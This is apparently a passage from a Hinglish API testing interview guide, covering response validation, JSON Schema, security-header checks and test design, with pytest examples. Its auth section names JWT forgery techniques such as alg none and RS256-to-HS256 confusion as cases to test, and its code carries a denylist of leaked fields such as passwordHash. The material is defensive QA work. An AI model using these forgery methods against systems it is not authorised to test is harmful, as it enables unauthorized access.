> every resource, and in GraphQL every field. So in practice the overwhelming majority of real
> auth defects are authorization defects, and yet most QA auth testing stops at 'no token
> returns 401', which is the authentication half.
>
> For JWT specifically I test the token as attacker-controlled input, because it is. The
> payload is just base64 — no secret needed to read it — so my first test decodes it and
> asserts nothing sensitive is in there and that it isn't so large it'll trip HTTP/2 header
> limits. Then the forgery set: `alg: none`, RS256-to-HS256 algorithm confusion where the
> public key is used as an HMAC secret, stripped signatures, flipped bits, and claim tampering
> across roles, org, subject, expiry and audience. Every one must come back 401, and
> critically never 500, because a 500 in the authentication filter is an unhandled exception
> on an unauthenticated code path — that's the highest-risk code in the system.
>
> On the authorization side, the thing I'd own in a multi-tenant system like ours is that org
> scoping is derived from the token and cannot be influenced by the caller. I test the same
> override three ways — header, body field, and query parameter — and I assert cross-org
> resources return 404 rather than 403, so we're not leaking which IDs exist.
>
> I structure all of this as a matrix rather than as individual tests: a list of protected
> endpoints crossed with a list of bad tokens. Six endpoints against nine token variants is
> fifty-four security tests, and adding a new endpoint to the suite is one line."

> **Cross-question: "You had 57 passing auth integration tests and the flow was still broken. What went wrong?"**
>
> "That's from our backend, and it's the most useful lesson I have. The tests covered token
> forgery, replay, expiry and cross-org access, and they all genuinely passed. The problem was
> that each test minted its own token and passed its own customerId. So each test proved that
> the component behaved correctly given the inputs the test itself constructed. What was never
> exercised was the seam: in the real flow, the token is issued by one component and the
> customerId is resolved by another, and nobody had tested that the identity in the token
> actually matches the identity the endpoint resolves. Every component passed its own contract
> and the composition was broken.
>
> The fix, and what I'd do differently, is to have at least one test per flow that acquires
> its credentials the same way production does — go through the real login or the real link
> issuance, don't construct anything — and then drive the whole journey with only what that
> flow gives you. If a test has to manufacture an input that a real client couldn't produce,
> it isn't testing the integration. That single test would have caught it, and it's why I now
> treat 'where do the test's inputs come from' as a design question, not a convenience
> question."

> **Cross-question: "How do you test authorization without becoming a huge maintenance burden?"**
>
> "As a data-driven matrix, not as hand-written tests. I define the roles once, define each
> endpoint once with the set of roles that should be allowed, and generate the cross product.
> Every role hits every endpoint, and for each cell I assert allowed-or-denied. That means the
> negative cases — which are the ones that actually find bugs — come for free, and a new
> endpoint costs one row. It also makes coverage visible: I can print the matrix and a
> reviewer or a product owner can look at it and say 'that cell is wrong', which they could
> never do with two hundred individually named test functions."

---

# PART 6 — Response Validation

## 6.0 Assertion ladder — dobara, kyunki yahi core hai

```
Layer 1  Status code        weakest  — necessary, never sufficient
Layer 2  Content-Type       "kya main sahi parser use kar raha hoon"
Layer 3  Response headers   security + caching + rate limit budget
Layer 4  Schema             structure, types, required, NO EXTRAS
Layer 5  Business values    STRONGEST — kya value sach mein sahi hai
Layer 6  Side effects       DB / downstream / event mein sahi cheez hui?
Layer 7  Non-effects        jo NAHI hona chahiye tha, wo nahi hua?
```

Layer 7 sabse zyada ignore hota hai aur sabse zyada valuable hai. Example: "carve create karne
pe koi email nahi jaana chahiye", "read-only endpoint hit karne pe koi audit-write nahi hona
chahiye".

## 6.1 Body validation — value-level assertions

### Weak vs strong assertions

```python
# ------- WEAK — ye tests kuch nahi pakadte -------
assert r.status_code == 200
assert r.json() is not None
assert "totalPrice" in r.json()
assert len(r.json()["lineItems"]) >= 0      # hamesha true, meaningless

# ------- STRONG — ye real bugs pakadte hain -------
body = r.json()
assert body["totalPrice"] == 4500000, f"Expected 4500000, got {body['totalPrice']}"
assert body["totalPrice"] is not None, "[REAL bug class] frozen price Sale entity se nahi aa raha"
assert len(body["lineItems"]) == 7
assert sum(li["amount"] for li in body["lineItems"]) == body["totalPrice"], \
    "Line items ka sum totalPrice se match nahi kar raha — arithmetic inconsistency"
assert body["currency"] == "INR"
assert body["status"] in {"DRAFT", "OPEN", "CLOSED", "CANCELLED"}
```

> **[REAL]** Wo `{"totalPrice": null, "lineItems": []}` bug — sirf ek assertion isko pakadti:
> `assert body["totalPrice"] is not None`. Aur usse behtar:
> `assert body["totalPrice"] == expected_frozen_price`. Status-code test, schema test (agar
> field nullable declared hai), aur "response mein totalPrice key hai" test — teeno pass ho
> jaate.

### Null-safety — ek dedicated helper

```python
def assert_no_unexpected_nulls(payload, allowed_null_paths=frozenset(), path=""):
    """Response mein kahin bhi unexpected null nahi hona chahiye.
    Ye ek generic helper hai jo poore tree ko walk karta hai.

    [REAL] Ye exact bug class jo Merlin mein mila tha — totalPrice null aa raha tha
    kyunki reader galat entity dekh raha tha. Aisa helper har response pe chalao,
    aur nullable fields ko explicitly allowlist karo."""
    if isinstance(payload, dict):
        for key, value in payload.items():
            child = f"{path}.{key}" if path else key
            if value is None and child not in allowed_null_paths:
                raise AssertionError(
                    f"Unexpected null at '{child}'. "
                    f"Agar ye legitimately nullable hai to allowed_null_paths mein daalo — "
                    f"tab ye ek documented decision ban jaata hai, accident nahi."
                )
            assert_no_unexpected_nulls(value, allowed_null_paths, child)
    elif isinstance(payload, list):
        for i, item in enumerate(payload):
            assert_no_unexpected_nulls(item, allowed_null_paths, f"{path}[{i}]")


def test_sale_response_has_no_unexpected_nulls(api, sale_id):
    body = api.get(f"/api/v1/sales/{sale_id}").json()
    assert_no_unexpected_nulls(body, allowed_null_paths={
        "closedAt",       # OPEN sale mein legitimately null
        "cancelReason",
        "notes",
    })
```

### Empty collections — do alag cheezein

```python
def test_empty_list_vs_missing_field(api, project_with_no_sales):
    """Ye distinction important hai:
      "lineItems": []    -> data exist karta hai, khaali hai. VALID.
      "lineItems": null  -> shayad fetch fail hua. SUSPICIOUS.
      key absent          -> serialization ne field skip kiya. BUG for clients.

    [REAL] Merlin ka bug empty array THA — `"lineItems": []` — jo dekhne mein
    valid empty state lagta hai. Isliye empty collection dekhne pe hamesha
    sawaal poocho: 'kya ye SACH MEIN khaali hona chahiye?'"""
    r = api.get(f"/api/v1/projects/{project_with_no_sales}/sales")
    body = r.json()

    assert r.status_code == 200, "Khaali collection 404 nahi, 200 + empty list honi chahiye"
    assert "items" in body, "items key gayab hai — clients crash karenge"
    assert body["items"] == [], "khaali honi chahiye thi"
    assert body["items"] is not None, "null nahi, empty array chahiye"
    assert body["total"] == 0
```

### Cross-field / arithmetic invariants

```python
def test_coverage_arithmetic_invariants(api, budget_id):
    """[REAL endpoint] GET /api/v1/budgets/{id}/coverage
    Financial endpoints mein arithmetic invariants sabse strong assertions hoti hain —
    kyunki wo business logic verify karti hain, structure nahi."""
    c = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()

    total = c["totalBudget"]
    carved = c["carvedAmount"]
    remaining = c["remainingAmount"]

    assert carved + remaining == total, (
        f"Arithmetic broken: carved({carved}) + remaining({remaining}) "
        f"!= total({total}), diff = {total - carved - remaining}"
    )
    assert 0 <= carved <= total, f"Carved amount range se bahar: {carved}"
    assert remaining >= 0, "Remaining negative — over-carve ho gaya"

    expected_pct = round(carved / total * 100, 2) if total else 0
    assert abs(c["coveragePercent"] - expected_pct) < 0.01, (
        f"Percentage mismatch: reported {c['coveragePercent']}, computed {expected_pct}"
    )

    # Aur sum of parts = whole
    assert sum(x["amount"] for x in c["carves"]) == carved, \
        "Individual carves ka sum aggregate se match nahi kar raha"
```

### Money — sabse zaroori validation class

```python
from decimal import Decimal

def test_money_is_never_a_float(api, sale_id):
    """Float mein paisa store karna classic bug hai — 0.1 + 0.2 = 0.30000000000000004.
    Sahi tareeke: integer paise/cents, ya string decimal.
    Ye test raw JSON text dekhta hai, parsed value nahi — kyunki
    Python float mein parse karke information kho deta hai."""
    r = api.get(f"/api/v1/sales/{sale_id}")
    raw = r.text

    # JSON mein "totalPrice": 4500000.5 jaisa kuch nahi hona chahiye
    import re
    floats = re.findall(r'"(totalPrice|amount|carvedAmount|remainingAmount)"\s*:\s*(-?\d+\.\d+)', raw)
    assert not floats, (
        f"Money field float ke roop mein aa rahe hain: {floats}. "
        "Integer minor units (paise) ya string decimal use karo."
    )


def test_money_precision_preserved(api, budget_id):
    """Ek amount bhejo jisme precision hai, wapas padho, exact match hona chahiye."""
    amount = 123456789    # paise mein = 12,34,567.89 rupees
    r = api.post(f"/api/v1/budgets/{budget_id}/carve",
                 json={"scopeId": "sc_precision", "amount": amount, "currency": "INR"})
    assert r.status_code == 201
    carve_id = r.json()["id"]

    back = api.get(f"/api/v1/carves/{carve_id}").json()
    assert back["amount"] == amount, (
        f"Round-trip mein precision gayi: bheja {amount}, mila {back['amount']}"
    )
```

### Round-trip consistency — create ke baad read

```python
def test_created_resource_matches_what_was_sent(api, budget_id):
    """Sabse underrated test. Create karo, phir GET karo, compare karo.
    Ye pakadta hai: field silently drop, type coercion, truncation,
    timezone shift, encoding mangling."""
    payload = {
        "scopeId": "sc_roundtrip",
        "amount": 250000,
        "currency": "INR",
        "notes": "Phase 2 — civil work, अनुबंध #431, emoji 🏗️, quote \" and \\ backslash",
    }
    created = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
    assert created.status_code == 201
    carve_id = created.json()["id"]

    fetched = api.get(f"/api/v1/carves/{carve_id}").json()

    for key, sent in payload.items():
        assert fetched[key] == sent, (
            f"Field '{key}' round-trip mein badal gaya:\n"
            f"  bheja: {sent!r}\n"
            f"  mila:  {fetched.get(key)!r}"
        )
```

### Timestamps

```python
from datetime import datetime, timezone

def test_timestamps_are_iso8601_utc(api, sale_id):
    """Timestamp bugs bahut common hain aur bahut confusing.
    Test karo: format, timezone marker, aur sanity (future/past)."""
    body = api.get(f"/api/v1/sales/{sale_id}").json()

    for field in ("createdAt", "updatedAt"):
        raw = body[field]
        assert isinstance(raw, str), f"{field} string nahi hai: {type(raw)}"
        assert raw.endswith("Z") or "+" in raw[-6:], (
            f"{field}='{raw}' mein timezone nahi hai — "
            "client isko local time maan ke parse karega, IST mein 5.5 hour ka error"
        )
        parsed = datetime.fromisoformat(raw.replace("Z", "+00:00"))
        assert parsed.tzinfo is not None

        now = datetime.now(timezone.utc)
        assert parsed <= now, f"{field} future mein hai: {parsed}"
        assert (now - parsed).days < 3650, f"{field} 10 saal se purana hai — epoch bug?"

    created = datetime.fromisoformat(body["createdAt"].replace("Z", "+00:00"))
    updated = datetime.fromisoformat(body["updatedAt"].replace("Z", "+00:00"))
    assert updated >= created, "updatedAt createdAt se pehle hai"
```

## 6.2 JSON Schema validation with `jsonschema`

### Kya hai

JSON Schema ek standard hai jisse aap JSON ka **structure** describe kar sakte ho —
declaratively. Phir ek library us schema ke against validate karti hai.

```bash
pip install jsonschema
```

### Basic worked example

```python
# schemas/carve.py
CARVE_SCHEMA = {
    "$schema": "https://json-schema.org/draft/2020-12/schema",
    "title": "Carve",
    "type": "object",

    # required — ye fields HONE hi chahiye
    "required": ["id", "budgetId", "scopeId", "amount", "currency",
                 "status", "createdAt", "createdBy"],

    # additionalProperties: false — SECURITY TEST (neeche detail)
    "additionalProperties": False,

    "properties": {
        "id": {
            "type": "string",
            "pattern": "^cv_[a-zA-Z0-9]{4,}$",       # format enforce karo
        },
        "budgetId": {"type": "string", "pattern": "^[a-f0-9]{24}$"},   # Mongo ObjectId
        "scopeId": {"type": "string", "minLength": 1},

        "amount": {
            "type": "integer",          # NOT number — float money bug rokta hai
            "minimum": 1,               # 0 aur negative reject
            "maximum": 999999999999,
        },
        "currency": {
            "type": "string",
            "enum": ["INR", "USD", "AED"],    # arbitrary string nahi
        },
        "status": {
            "type": "string",
            "enum": ["ACTIVE", "REVERSED", "SUPERSEDED"],
        },
        "notes": {
            "type": ["string", "null"],       # explicitly nullable
            "maxLength": 2000,
        },
        "createdAt": {"type": "string", "format": "date-time"},
        "createdBy": {"type": "string", "pattern": "^u_"},

        "lineItems": {
            "type": "array",
            "minItems": 0,
            "items": {
                "type": "object",
                "required": ["id", "description", "amount"],
                "additionalProperties": False,
                "properties": {
                    "id": {"type": "string"},
                    "description": {"type": "string", "maxLength": 500},
                    "amount": {"type": "integer", "minimum": 0},
                },
            },
        },
    },
}
```

```python
# tests/test_schema.py
import jsonschema
from jsonschema import Draft202012Validator, FormatChecker


def validate_schema(payload, schema, context=""):
    """Saare errors ek saath dikhao, pehla error pe ruko mat.
    Default jsonschema.validate() pehli error pe throw karta hai —
    jo debugging mein bura hai."""
    validator = Draft202012Validator(schema, format_checker=FormatChecker())
    errors = sorted(validator.iter_errors(payload), key=lambda e: list(e.path))
    if errors:
        lines = [f"Schema validation failed {context} ({len(errors)} errors):"]
        for e in errors:
            path = "$" + "".join(
                f"[{p}]" if isinstance(p, int) else f".{p}" for p in e.absolute_path
            )
            lines.append(f"  {path}: {e.message}")
        raise AssertionError("\n".join(lines))


def test_carve_response_matches_schema(api, budget_id):
    r = api.post(f"/api/v1/budgets/{budget_id}/carve",
                 json={"scopeId": "sc_schema", "amount": 250000, "currency": "INR"})
    assert r.status_code == 201
    validate_schema(r.json(), CARVE_SCHEMA, context="POST /budgets/{id}/carve")
```

### `additionalProperties: false` — ye ek SECURITY test hai

Ye sabse important schema feature hai QA ke liye, aur zyadatar log isko miss karte hain.

**Kya karta hai:** agar response mein koi aisa field aa jaye jo schema mein declared nahi
hai — validation **fail** ho jaati hai.

**Kyun ye security test hai:**

```python
def test_sale_response_does_not_leak_internal_fields(api, sale_id):
    """[SECURITY] additionalProperties: false ka asli use.

    Backend developer entity mein ek naya field add karta hai —
    'internalMargin', 'costPrice', 'approverNotes', 'orgId', '_class' —
    aur agar serialization automatic hai (Jackson entity ko seedha serialize kar raha hai),
    wo field customer-facing response mein pahunch jaata hai.

    Koi bhi normal test isko nahi pakadta, kyunki EXTRA field se
    kuch toota nahi — sab existing assertions pass ho jaati hain.

    additionalProperties: false isko turant pakadta hai."""
    body = api.get(f"/api/v1/sales/{sale_id}").json()
    validate_schema(body, SALE_PUBLIC_SCHEMA, context=f"GET /sales/{sale_id}")


# Aur ek explicit denylist bhi rakho — double protection
FORBIDDEN_FIELDS = {
    "_id", "_class", "__v",              # ORM/Mongo internals
    "orgId", "tenantId",                 # internal scoping ids
    "internalMargin", "costPrice",       # commercially sensitive
    "createdByUserEmail", "approverNotes",
    "passwordHash", "salt",
    "deletedAt", "isDeleted",            # soft-delete internals
}


def test_no_forbidden_fields_anywhere_in_tree(api, sale_id):
    """Nested objects mein bhi check karo — top level clean ho sakta hai
    lekin nested customer object mein internal field ho sakta hai."""
    body = api.get(f"/api/v1/sales/{sale_id}").json()
    found = []

    def walk(node, path=""):
        if isinstance(node, dict):
            for k, v in node.items():
                p = f"{path}.{k}" if path else k
                if k in FORBIDDEN_FIELDS:
                    found.append(p)
                walk(v, p)
        elif isinstance(node, list):
            for i, item in enumerate(node):
                walk(item, f"{path}[{i}]")

    walk(body)
    assert not found, f"Internal fields response mein leak ho rahe hain: {found}"
```

> **Interview mein ye point bolo:** "`additionalProperties: false` is the one schema keyword I
> treat as a security control rather than a correctness control. Extra fields never break a
> client, so no functional test catches them — but they're exactly how internal fields like
> cost price, internal margins, or ORM metadata end up in a customer-facing payload."

### Reusable schema fragments — `$ref` aur `$defs`

```python
COMMON_DEFS = {
    "$defs": {
        "objectId":  {"type": "string", "pattern": "^[a-f0-9]{24}$"},
        "money":     {"type": "integer", "minimum": 0},
        "currency":  {"type": "string", "enum": ["INR", "USD", "AED"]},
        "timestamp": {"type": "string", "format": "date-time"},
        "userRef":   {
            "type": "object",
            "required": ["id", "name"],
            "additionalProperties": False,
            "properties": {
                "id": {"type": "string", "pattern": "^u_"},
                "name": {"type": "string"},
            },
        },
        "pageMeta": {
            "type": "object",
            "required": ["total", "page", "pageSize", "hasNext"],
            "additionalProperties": False,
            "properties": {
                "total":    {"type": "integer", "minimum": 0},
                "page":     {"type": "integer", "minimum": 1},
                "pageSize": {"type": "integer", "minimum": 1, "maximum": 200},
                "hasNext":  {"type": "boolean"},
            },
        },
    }
}

SALE_LIST_SCHEMA = {
    "$schema": "https://json-schema.org/draft/2020-12/schema",
    **COMMON_DEFS,
    "type": "object",
    "required": ["items", "meta"],
    "additionalProperties": False,
    "properties": {
        "items": {
            "type": "array",
            "items": {
                "type": "object",
                "required": ["id", "status", "totalPrice", "currency", "createdAt"],
                "additionalProperties": False,
                "properties": {
                    "id":         {"type": "string", "pattern": "^s_"},
                    "status":     {"type": "string",
                                   "enum": ["DRAFT", "OPEN", "CLOSED", "CANCELLED"]},
                    "totalPrice": {"$ref": "#/$defs/money"},
                    "currency":   {"$ref": "#/$defs/currency"},
                    "createdAt":  {"$ref": "#/$defs/timestamp"},
                    "createdBy":  {"$ref": "#/$defs/userRef"},
                },
            },
        },
        "meta": {"$ref": "#/$defs/pageMeta"},
    },
}
```

### Conditional schema — `if/then` aur `oneOf`

```python
SALE_SCHEMA_CONDITIONAL = {
    "$schema": "https://json-schema.org/draft/2020-12/schema",
    "type": "object",
    "required": ["id", "status"],
    "properties": {
        "id":       {"type": "string"},
        "status":   {"type": "string", "enum": ["OPEN", "CLOSED", "CANCELLED"]},
        "closedAt": {"type": ["string", "null"], "format": "date-time"},
        "closedBy": {"type": ["string", "null"]},
        "cancelReason": {"type": ["string", "null"]},
    },
    "allOf": [
        {
            # Agar status CLOSED hai, to closedAt aur closedBy NULL nahi ho sakte
            "if":   {"properties": {"status": {"const": "CLOSED"}}},
            "then": {
                "required": ["closedAt", "closedBy"],
                "properties": {
                    "closedAt": {"type": "string"},     # null allowed nahi
                    "closedBy": {"type": "string"},
                },
            },
        },
        {
            # Agar status OPEN hai, to closedAt null HONA chahiye
            "if":   {"properties": {"status": {"const": "OPEN"}}},
            "then": {"properties": {"closedAt": {"type": "null"}}},
        },
        {
            "if":   {"properties": {"status": {"const": "CANCELLED"}}},
            "then": {"required": ["cancelReason"],
                     "properties": {"cancelReason": {"type": "string", "minLength": 1}}},
        },
    ],
}
```

**Ye powerful hai:** schema ab state machine invariants enforce kar raha hai, sirf types nahi.
"CLOSED sale ka closedAt null nahi ho sakta" ek business rule hai jo ab automatically har
response pe check ho rahi hai.

### Schema generate karna — jab documentation nahi hai

```python
# pip install genson
from genson import SchemaBuilder

def generate_schema_from_samples(responses):
    """Undocumented API ke liye: kai sample responses se ek starting schema banao.
    Phir usse manually tighten karo — enums, patterns, minimums add karo,
    aur additionalProperties: false lagao.

    IMPORTANT: generated schema hamesha permissive hota hai.
    Isko baseline maano, final answer nahi."""
    builder = SchemaBuilder()
    for r in responses:
        builder.add_object(r)
    return builder.to_schema()


def test_bootstrap_schema_from_prod_samples(api):
    samples = [api.get(f"/api/v1/sales/{sid}").json() for sid in SAMPLE_SALE_IDS]
    schema = generate_schema_from_samples(samples)
    print(json.dumps(schema, indent=2))
    # Ise commit karo, phir manually tighten karo
```

### Schema drift detection — sabse valuable test

```python
def test_schema_has_not_drifted(api, sale_id, snapshot_dir):
    """Schema ko file mein snapshot karo. Agar API badalti hai,
    ye test fail hoga — aur team ko CONSCIOUSLY decide karna padega
    ki ye breaking change hai ya nahi.

    Ye 'accidental breaking change' ko rokta hai — jo sabse common
    API incident cause hai."""
    from genson import SchemaBuilder
    builder = SchemaBuilder()
    builder.add_object(api.get(f"/api/v1/sales/{sale_id}").json())
    current = builder.to_schema()

    snapshot_file = snapshot_dir / "sale_schema.json"
    if not snapshot_file.exists():
        snapshot_file.write_text(json.dumps(current, indent=2, sort_keys=True))
        pytest.skip("Snapshot banaya — review karke commit karo")

    expected = json.loads(snapshot_file.read_text())

    current_fields = set(current.get("properties", {}))
    expected_fields = set(expected.get("properties", {}))

    removed = expected_fields - current_fields
    added = current_fields - expected_fields

    assert not removed, (
        f"BREAKING CHANGE: fields hata diye gaye: {removed}. "
        "Clients toot sakte hain."
    )
    if added:
        pytest.fail(
            f"Naye fields add hue: {added}. "
            "Ye non-breaking hai, lekin review karo ki koi internal field leak to nahi ho raha. "
            "Theek hai to snapshot update kar do."
        )
```

## 6.3 Response header validation

```python
SECURITY_HEADERS = {
    "X-Content-Type-Options":   "nosniff",
    "X-Frame-Options":          ("DENY", "SAMEORIGIN"),
    "Strict-Transport-Security": None,      # sirf presence check
    "Referrer-Policy":          None,
}


@pytest.mark.security
def test_security_headers_present(api, sale_id):
    r = api.get(f"/api/v1/sales/{sale_id}")
    missing = []
    for header, expected in SECURITY_HEADERS.items():
        actual = r.headers.get(header)
        if actual is None:
            missing.append(header)
        elif expected is not None:
            allowed = expected if isinstance(expected, tuple) else (expected,)
            assert actual in allowed, f"{header}={actual}, expected one of {allowed}"
    assert not missing, f"Security headers missing: {missing}"


@pytest.mark.security
def test_no_server_fingerprinting_headers(api, sale_id):
    """Server/framework version batana attacker ko exact CVE dhundhne mein help karta hai."""
    r = api.get(f"/api/v1/sales/{sale_id}")
    for header in ("Server", "X-Powered-By", "X-AspNet-Version", "X-Runtime"):
        value = r.headers.get(header, "")
        assert not re.search(r"\d+\.\d+", value), (
            f"{header}: '{value}' — version disclose ho raha hai"
        )


@pytest.mark.security
def test_sensitive_endpoints_are_not_cacheable(api, sale_id):
    """User-specific financial data shared cache mein nahi jaana chahiye.
    Warna proxy/CDN kisi aur user ko serve kar sakta hai."""
    r = api.get(f"/api/v1/sales/{sale_id}")
    cc = r.headers.get("Cache-Control", "").lower()
    assert "no-store" in cc or "private" in cc, (
        f"Cache-Control='{cc}' — user-specific data shared cache mein ja sakta hai"
    )
    assert "public" not in cc, "Cache-Control: public on user-specific data"


def test_content_type_is_json_with_charset(api, sale_id):
    r = api.get(f"/api/v1/sales/{sale_id}")
    ct = r.headers.get("Content-Type", "")
    assert ct.startswith("application/json"), f"Content-Type='{ct}'"
    # charset explicit hona chahiye — warna client ko guess karna padta hai
    assert "charset" in ct.lower() or True   # ye advisory hai, JSON default UTF-8 hai


def test_correlation_id_is_echoed(api, sale_id):
    """Jo X-Request-Id maine bheja, wahi response mein wapas aana chahiye.
    Isse main bug report mein exact id de sakta hoon."""
    rid = str(uuid.uuid4())
    r = api.get(f"/api/v1/sales/{sale_id}", headers={"X-Request-Id": rid})
    echoed = r.headers.get("X-Request-Id") or r.headers.get("X-Correlation-Id")
    assert echoed == rid, (
        f"Correlation id echo nahi hua (bheja {rid}, mila {echoed}) — "
        "failures ko logs se correlate karna mushkil ho jaayega"
    )
```

## 6.4 Response time validation

```python
def test_response_time_within_budget(api, project_id):
    """Har test mein ek soft timing assertion daalna ek achhi practice hai —
    ye performance regressions ko functional suite mein hi pakad leta hai.

    LEKIN: ek single measurement noisy hoti hai. Isliye:
      - budget generous rakho (p95 se 2-3x)
      - ya multiple samples lo aur median use karo
      - CI mein ise WARNING banao, hard failure nahi — warna flaky hoga"""
    samples = []
    for _ in range(5):
        r = api.get(f"/api/v1/projects/{project_id}/sales")
        assert r.status_code == 200
        samples.append(r.elapsed.total_seconds())

    median = statistics.median(samples)
    assert median < 1.5, (
        f"Median response time {median*1000:.0f}ms > 1500ms budget. "
        f"Samples: {[f'{s*1000:.0f}ms' for s in samples]}"
    )
```

**`r.elapsed` kya measure karta hai — ye cross-question aata hai:**

```python
# requests ka r.elapsed = request bhejne se lekar RESPONSE HEADERS milne tak.
# Body download ka time ISME NAHI hai (jab tak stream=False na ho).
# Aur DNS + TCP + TLS handshake bhi included hai (pehli request pe).
#
# Isliye:
#   - Pehli request hamesha slow dikhegi (connection setup)
#   - Session use karne se ye overhead hat jaata hai (connection reuse)
#   - Bade response ke liye r.elapsed asli picture nahi deta

def measure_full_time(api, path, warmup=True):
    """Zyada accurate timing — connection warm karke, poora body padhke."""
    if warmup:
        api.get(path)          # connection establish karo

    t0 = time.perf_counter()
    r = api.get(path)
    _ = r.content              # poora body force download
    return time.perf_counter() - t0
```

> **Interview answer (response validation):**
>
> "I think of validation as a ladder, weakest to strongest. Status code, content type, response
> headers, schema, business values, side effects, and finally non-effects — asserting that
> what shouldn't have happened didn't. Most test suites stop at the second rung, and that's
> why they pass while the product is broken.
>
> For schema I use JSON Schema with the `jsonschema` library, and I collect all errors rather
> than failing on the first, because a schema failure with one message is painful to debug.
> The keyword I care about most is `additionalProperties: false`, and I treat it as a security
> control rather than a correctness one. Extra fields never break a client, so no functional
> assertion catches them — but they're exactly how an internal field like cost price, an
> internal margin, or ORM metadata like `_class` ends up in a customer-facing payload when
> someone adds a column to an entity that's being serialised directly. I pair it with an
> explicit denylist walked over the whole response tree, because nested objects are where it
> actually leaks.
>
> But schema validation has a hard limit, and I'd say this explicitly: it validates shape, not
> truth. The worst bug I found at Merlin was a customer-facing endpoint returning
> `totalPrice: null` and an empty `lineItems` array for a contract with a real value. If
> `totalPrice` is declared nullable — and most fields are — the schema passes that response
> perfectly. So on top of schema I run a null-safety walk with an explicit allowlist of
> genuinely-nullable paths, arithmetic invariants like carved plus remaining equals total and
> the sum of line items equals the header total, and round-trip checks where I create a
> resource and read it back to catch silent drops, truncation and encoding damage."

> **Cross-question: "Isn't asserting exact values brittle? Tests will break on every data change."**
>
> "It's brittle if the test depends on data it didn't create. So the rule I follow is that a
> test asserts exact values only on data it set up itself in that test — I create the carve
> with amount 250000, so asserting 250000 comes back is stable forever. For pre-existing or
> shared data I assert invariants instead of literals: the parts sum to the whole, the
> percentage matches the ratio, the timestamps are ordered, nothing is unexpectedly null. Those
> hold regardless of what the data is, and they still catch real bugs. The failure mode I'm
> avoiding is the opposite one — a test so loose it asserts only that a key exists, which
> passes happily while the value is null."

---

# PART 7 — Test Design: ek endpoint ka POORA suite

Ye part sabse important hai. Interview mein "ek endpoint do, uska test design batao" aata hai,
aur yahan aapko systematic dikhna hai — random test cases nahi.

## 7.0 Endpoint jo hum design kar rahe hain

```
POST /api/v1/budgets/{budgetId}/carve
Authorization: Bearer <jwt>
Content-Type: application/json
Idempotency-Key: <uuid>      (optional)

{
  "scopeId": "sc_884",
  "amount": 250000,
  "currency": "INR",
  "notes": "Phase 2 civil work"
}

201 Created
Location: /api/v1/carves/cv_99231
{
  "id": "cv_99231",
  "budgetId": "6512ab34cd9e1f0012345678",
  "scopeId": "sc_884",
  "amount": 250000,
  "currency": "INR",
  "status": "ACTIVE",
  "createdAt": "2026-08-23T04:12:33Z",
  "createdBy": "u_123"
}
```

**Business rules jo mujhe pata hain (ya jo mujhe confirm karne padenge):**
1. Ek scope ek hi baar carve ho sakta hai (unique partial index DB pe)
2. Carve amount budget ke remaining amount se zyada nahi ho sakta
3. Sirf SALES_MANAGER aur ADMIN carve kar sakte hain
4. Budget ka status ACTIVE hona chahiye
5. Budget aur scope dono caller ke org ke hone chahiye

## 7.1 Test design ka framework — 8 dimensions

Ye 8 dimensions har endpoint pe apply hoti hain. Interview mein ye list bolna aapko
systematic dikhata hai:

```
1. FUNCTIONAL      — happy path. kya wo cheez hoti hai jo honi chahiye?
2. VALIDATION      — har input field, har invalid value. parametrized.
3. AUTHORIZATION   — kaun kar sakta hai, kaun nahi. role x resource matrix.
4. BUSINESS RULES  — domain logic. limits, state machine, invariants.
5. IDEMPOTENCY     — retry safe hai?
6. CONCURRENCY     — do requests ek saath?
7. SCHEMA          — structure + no leaks.
8. PERFORMANCE     — kitna time? load pe kya hota hai?
+ SECURITY         — injection, mass assignment, tenant bypass (cross-cutting)
```

## 7.2 Test IDs aur traceability

Pehle test ids define karo. Ye bug reports aur coverage discussions mein directly kaam aate
hain.

| ID | Dimension | Test |
|---|---|---|
| CV-F-01 | Functional | Valid carve creates resource, returns 201 + Location |
| CV-F-02 | Functional | Created carve fetchable at Location URL |
| CV-F-03 | Functional | Coverage endpoint reflects the new carve |
| CV-V-01..12 | Validation | Each field, each invalid value |
| CV-A-01..08 | Authorization | Roles, cross-org, no token, bad token |
| CV-B-01..06 | Business | Over-budget, duplicate scope, inactive budget, state |
| CV-I-01..03 | Idempotency | Same key returns same result, different key creates new |
| CV-C-01..02 | Concurrency | Two concurrent carves, exactly one wins |
| CV-S-01..03 | Schema | Response matches schema, no extra fields |
| CV-P-01..02 | Performance | p95 under budget, no N+1 under load |
| CV-SEC-01..06 | Security | NoSQL injection, mass assignment, error leakage |

## 7.3 Fixtures — foundation

```python
# tests/conftest.py
import os, uuid, json, time, statistics
import pytest
import requests
from typing import Optional

BASE_URL = os.environ["API_BASE_URL"]        # https://staging.merlinai.co


# ---------------------------------------------------------------- clients

@pytest.fixture(scope="session")
def api_admin():
    """ADMIN role ka client. Setup/teardown ke liye."""
    return ApiClient(BASE_URL, token=login_as(os.environ["ADMIN_EMAIL"],
                                              os.environ["ADMIN_PASSWORD"]))


@pytest.fixture(scope="session")
def api(api_sales_manager):
    """Default client — SALES_MANAGER, kyunki carve ke liye yahi role chahiye."""
    return api_sales_manager


@pytest.fixture(scope="session")
def api_sales_manager():
    return ApiClient(BASE_URL, token=login_as(os.environ["SM_EMAIL"],
                                              os.environ["SM_PASSWORD"]))


@pytest.fixture(scope="session")
def api_viewer():
    return ApiClient(BASE_URL, token=login_as(os.environ["VIEWER_EMAIL"],
                                              os.environ["VIEWER_PASSWORD"]))


@pytest.fixture(scope="session")
def api_other_org():
    """DUSRE ORG ka user. Tenant isolation tests ke liye ye zaroori hai —
    aur ye ek REAL account hona chahiye, forged token nahi.
    [REAL lesson] Merlin ke 57 tests isliye fail hue kyunki wo apne tokens
    khud mint karte the. Real accounts use karo."""
    return ApiClient(BASE_URL, token=login_as(os.environ["OTHER_ORG_EMAIL"],
                                              os.environ["OTHER_ORG_PASSWORD"]))


@pytest.fixture(scope="session")
def api_no_auth():
    return ApiClient(BASE_URL, token=None)


# ---------------------------------------------------------------- test data

@pytest.fixture
def budget(api_admin):
    """FUNCTION-scoped fresh budget. Har test apna data banata hai —
    ye parallel execution aur test independence ke liye zaroori hai.

    Isolation strategy: create-per-test. Alternatives Part 12 Q5 mein."""
    resp = api_admin.post("/api/v1/budgets", json={
        "projectId": os.environ["TEST_PROJECT_ID"],
        "name": f"pytest-budget-{uuid.uuid4().hex[:8]}",
        "totalAmount": 10_000_000,        # 1 crore paise = 1 lakh rupees
        "currency": "INR",
        "scopes": [
